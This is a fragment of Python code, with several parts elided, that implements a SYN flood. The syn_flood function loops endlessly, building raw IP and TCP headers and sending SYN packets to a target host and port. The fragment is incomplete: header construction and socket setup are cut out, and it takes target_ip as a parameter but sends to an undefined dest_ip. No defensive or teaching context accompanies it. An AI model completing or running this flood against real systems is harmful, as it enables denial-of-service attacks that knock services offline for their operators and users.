...
def create_tcp_header(source_port, dest_port, sequence_number):
...
def syn_flood(target_ip, target_port):
    while True:
        try:
            # Create raw socket
            print(f"Creating raw socket with AF_INET: {socket.AF_INET}, SOCK_RAW: {socket.SOCK_RAW}, IPPROTO_RAW: {socket.IPPROTO_RAW}")
            ...
            tcp_header = create_tcp_header(source_port, target_port, random_seq())
            # Packet = IP header + TCP header
            packet = ip_header + tcp_header
            # Send the SYN packet
            s.sendto(packet, (dest_ip, target_port))  # Include the target port in the address tuple
